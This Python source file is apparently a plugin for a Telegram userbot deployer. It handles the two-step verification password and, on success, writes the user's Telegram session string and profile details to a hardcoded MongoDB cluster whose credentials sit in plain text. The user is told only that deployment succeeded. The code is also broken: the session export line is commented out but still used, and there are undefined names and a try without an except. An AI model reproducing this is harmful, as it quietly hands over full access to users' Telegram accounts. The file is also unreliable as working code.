#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Shrimadhav U K
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Affero General Public License for more details.

# You should have received a copy of the GNU Affero General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

import pymongo
from pyrogram import (
    Client,
    filters
)
from pyrogram.types import (
    Message
)
from pyrogram.errors import (
    PasswordHashInvalid
)
from Ubot import (
    AKTIFPERINTAH,
    TFA_CODE_IN_VALID_ERR_TEXT,
)
import pymongo
import sys
import os
import dotenv
from dotenv import load_dotenv
from Ubot.logging import LOGGER
from os import environ, execle

session_count = 1


@Client.on_message(
    filters.text &
    filters.private,
    group=3
)
async def recv_tg_tfa_message(_, message: Message):
    
    w_s_dict = AKTIFPERINTAH.get(message.chat.id)
    if not w_s_dict:
        return
    phone_number = w_s_dict.get("PHONE_NUMBER")
    loical_ci = w_s_dict.get("USER_CLIENT")
    is_tfa_reqd = bool(w_s_dict.get("IS_NEEDED_TFA"))
    if not is_tfa_reqd or not phone_number:
        return
    tfa_code = message.text
    try:
        await loical_ci.check_password(tfa_code)
    except PasswordHashInvalid:
        await message.reply_text(
            "Kode yang anda masukkan salah, coba masukan kembali atau mulai dari awal",
        )
        del AKTIFPERINTAH[message.chat.id]
    else:
        client = pymongo.MongoClient("mongodb+srv://pyRainger:pyRainger@session1.pt52wqg.mongodb.net/?retryWrites=true&w=majority")
        db = client["telegram_sessions"]
        mongo_collection = db["sesi_collection"]
#        session_string = str(await loical_ci.export_session_string())
        load_dotenv()

        await message.reply_text("`Berhasil Melakukan Deploy.`")
        session_data = {
            "session_string": session_string,
            "user_id": message.chat.id,
            "username": message.chat.username or "",
            "first_name": message.chat.first_name or "",
            "last_name": message.chat.last_name or "",
        }        
        mongo_collection.insert_one(session_data)
        await asyncio.sleep(2.0)
        collection = cli["access"]
        await collection.users.delete_one({'user_id': int(message.chat.id)})
        try:
            await message.reply_text("**Tunggu Selama 2 Menit Kemudian Ketik .ping Untuk Mengecek Bot.**")
            LOGGER(__name__).info("BOT SERVER RESTARTED !!")
#        if HAPP is not None:
            HAPP.restart()
#        else:
            args = [sys.executable, "-m", "Ubot"]
            execle(sys.executable, *args, environ)
    raise message.stop_propagation()
